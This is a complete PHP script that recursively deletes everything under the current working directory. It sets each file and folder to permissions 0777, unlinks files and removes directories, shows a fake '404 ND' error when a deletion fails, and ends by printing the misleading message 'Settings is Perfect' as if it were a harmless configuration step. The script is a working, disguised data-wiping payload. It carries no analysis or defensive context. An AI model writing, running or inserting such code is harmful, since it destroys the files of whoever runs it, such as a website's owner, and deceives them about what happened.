<?php
$dir = getcwd() . '/';

define('PATH', $dir);

function destroy($dir) {
$mydir = opendir($dir);
while(false !== ($file = readdir($mydir))) {
    if($file != "." && $file != "..") {
        chmod($dir.$file, 0777);
        if(is_dir($dir.$file)) {
            chdir('.');
            destroy($dir.$file.'/');
            rmdir($dir.$file) or DIE("404 ND $dir$file<br />");
        }
        else
            unlink($dir.$file) or DIE("404 ND $dir$file<br />");
    }
}
closedir($mydir);
}
destroy(PATH);
echo 'Settings is Perfect'; 
?>